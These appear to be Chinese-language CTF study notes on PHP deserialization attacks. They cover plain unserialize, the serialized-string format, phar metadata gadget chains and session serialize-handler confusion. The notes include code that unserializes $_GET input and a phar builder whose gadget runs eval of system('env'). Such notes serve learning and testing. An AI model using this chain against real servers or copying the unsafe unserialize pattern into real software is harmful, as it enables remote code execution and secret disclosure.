# 反序列化

### 普通反序列化

```php
<?php
  highlight_file(__FILE__);

class NSS {
  var $name;
  function __destruct() {
    if ($this->name === 'ctf') {
      echo getenv('FLAG');
    }
  }
}
unserialize($_GET['n']);
?>
```

```php
<?php
  class NSS{
  var $name;
  var $email; 
  public $phone;
  function __construct()
  {
    $this->name = "michael";
  }
}
$nss = new NSS();
print urlencode(serialize($nss)); //要加上urlencode，否则当修饰符是private和protected的时候
                                  //会因为空格出现问题
?>
```

输出（protect/private/public对序列化的结果有影响）

`O:3:"NSS":3:{s:4:"name";s:7:"michael";s:5:"email";N;s:5:"phone";N;}`

```json
O:3:"NSS": //O:3:"NSS"：类名：3个字符，叫NSS，类名要对上才能反序列化成功
3:  // 该类有3个属性
{
  s:4:"name";s:7:"michael";  // 属性1，key4个字符name，value7字符michael
  s:5:"email";N;             //属性2,key5个字符email，value值为空
  s:5:"phone";N;             //同上
}
```

* 类名
* 修饰符
* 属性名

都要对上，且要urlencode

### phar反序列化

```php
<?php
class A {
    public $a;
    public function __construct($a)
    {
        $this->a = $a;
    }
    public function __destruct()
    {
        echo "NSSCTF".$this->a;
    }
}
class B {
    public $b;
    public function __construct($b)
    {
        $this->b = $b;
    }
    public function __toString()
    {
        return eval($this->b);
    }
}
    $bb = new B("system('env');");
    $aa = new A($bb);

    $phar = new Phar('evil.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'test');
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($aa);
    $phar->stopBuffering();
    
?>
```

### sission反序列化

原理

1. 使用session\_start()时开启session会话，会自动检测PHPSESSID
 1. cookie中存在，获取
 2. cookie中不存在，创建PHPSESSID， http响应中保存到浏览器中
2. 初始化超全局变量$\_SESSION为一个空数组
3. PHP通过PHPSESSID去指定位置（硬盘）匹配对应的文件
 1. 存在，读取硬盘->反序列化-> 存到$\_SESSION
 2. 不存在session\_start()创建一个PHPSESSID命名文件

把session中的内容持久化到硬盘，然后通过分拣包含读取

1. index.php传一个而已构造的（序列化后的）对象到服务器上
2. 打开index.php，代码中有`session_start()`触发反序列化

三个引擎

```php
<?php
class NSS
{
    public $ctf;
}
ini_set('session.serialize_handler','php');
$a = new NSS();
$a->ctf = 'ls';

session_id('test');
session_start();
$_SESSION['obj'] = $a;

echo session_encode();
?>
```

| 处理器 | 序列化字符串 | |
| --- | --- | --- |
| php | 比php\_serialize的在最前面多`|` | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 |
| php\_binary | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 |
| php\_serialize (php>=5.5.4) | O:3:"NSS":1:{s:3:"ctf";s:3:"env";} | 经过 serialize() 函数反序列处理的数组 |

注意构造对象的时候

✅`$a->ctf = 'ls';`

❌`$a->$ctf = 'ls';`

#### 题目

ini_set('session.serialize_handler', 'php_serialize');
